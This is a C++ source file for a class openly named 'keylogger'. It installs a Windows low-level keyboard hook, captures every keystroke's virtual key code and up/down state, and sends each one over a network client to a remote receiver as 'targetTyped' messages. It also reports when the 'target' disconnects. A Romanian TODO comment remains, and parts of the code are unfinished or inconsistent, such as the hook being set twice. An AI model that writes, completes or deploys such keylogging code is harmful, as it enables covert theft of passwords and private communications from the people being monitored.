#include "keylogger.h"


keylogger::keylogger()
    : hook(SetWindowsHookExA(WH_KEYBOARD_LL, &keylogger::lowLevelKeyboardProc, NULL, 0)),
    client(&validation_function)
{
    hook = SetWindowsHookEx(WH_KEYBOARD_LL, &keylogger::lowLevelKeyboardProc, NULL, 0);

}

keylogger::~keylogger()
{
    if (hook != NULL)
        UnhookWindowsHookEx(hook);

    kq::message<messageType> msg(messageType::targetDisconnected);
    client.Send(msg);
    client.Disconnect();
}

void keylogger::handleKeyStroke(DWORD virtualKeyCode, keyStatus status)
{
    kq::message<messageType> msg(messageType::targetTyped);
    msg << virtualKeyCode << status;
    client.Send(msg);
}

LRESULT CALLBACK keylogger::lowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    static bool caps;
    
    if (nCode >= 0 ) {
        KBDLLHOOKSTRUCT* kbdStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
        DWORD virtualKeyCode = kbdStruct->vkCode;
        keyStatus status = (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) ? keyStatus::keyDown : keyStatus::keyUp;
        transKeys.handleKeyStroke(virtualKeyCode, status);
    }

 // TODO: Trimitem virtualKey ul si cu state pentru downkey si togglekey
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

